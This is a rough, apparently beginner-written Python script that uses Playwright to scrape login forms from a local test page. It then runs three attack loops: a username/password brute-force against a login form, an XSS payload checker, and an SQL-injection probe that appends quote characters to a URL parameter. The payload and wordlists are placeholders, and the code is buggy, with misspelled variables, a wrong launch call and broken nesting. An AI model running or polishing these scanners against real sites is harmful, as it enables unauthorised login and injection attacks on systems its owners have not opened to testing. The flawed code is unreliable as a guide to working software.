#fix terminal : list ,... i don't know
#like meta sploit  and beutyful  but not now for all sploit i learned
# import forms
# hi this program not yet it's just some of testing
from playwright.sync_api import sync_playwright
with sync_playwright() as pr :
    #playwright is a name of broswer in ligne 5
    broswer=pr.playwright.launch(headless=True)#anonymous broswing
    page=broswer.new_page()
    page.goto('http://127.0.0.1:5500/index.html')
    forms=page.query_selector_all('form')
    for f in forms:
        print(f.inner_html())
    broswer.close()
# brute force attack
url= 'http://127.0.0.1:5500/index.html'
#you have to got this by the import form
username1="input[name='uname']"
password1="input[name='pass']"
login="input[type='submit']"
text = 'is something not change in the page login'
usernames=['its a list of name to try it']
passwords=['it s a list of password to try it']
with sync_playwright() as pr :
    broswer = pr.playwright.launch(headless=True)
    page=broswer.new_page()
    page.goto(url)
    for us in usernames:
        for ps in passwords:
            page.fill(username1,us)#write this list in the forms
            page.fill(password1,ps)#the same thing
            page.click(login)
            try:
                if text in page.content():
                    print(f'[-]login error for username {us}| password{ps}')
                else:
                    print(f'[+] login successful! username: {us} password:{ps}')
                    exit()
            except:#you can use rich for coloring 
                pass
broswer.close()
#xss injection   you can got it by forms
payoads=['you can got it in github ']
with sync_playwright() as p :
    browser= p.chromium.launch(headless=True)
    page= browser.new_page()
    url='the url'
    page.goto(url)
    in_one='input from forms'
    in_tow='and this '
    for payload in payoads:
        page=broswer.new_page()
        page.goto(url)
        page.fill(in_one,payload)
        page.click(in_tow)
        if payload in page.content():
            print(f'[+] xss found in {url} payload : {payload}')
        else:
            print(f'[-] xss not foun in {url}  payload: {payload}')
    broswer.close()
    #sql injection 
    payloads=["'","and this also you can got it in github"]
    with sync_playwright() as p:
        broswer=p.chromium.launch(headless=True)
        page =broswer.new_page()
        base_url='the base url the parameter php?test=querty'
        page.goto(base_url)
        one_code=page.text_content('body')
        for payload in payloads :
            url_with_payload =f"{base_url}{payload}"
            page.goto(url_with_payload)
            tow_code=page.text_content('body')
            if one_code != tow_code :
                print(f'[+] sql found {base_url}| {payload}')
                print(tow_code)
            else:
                pass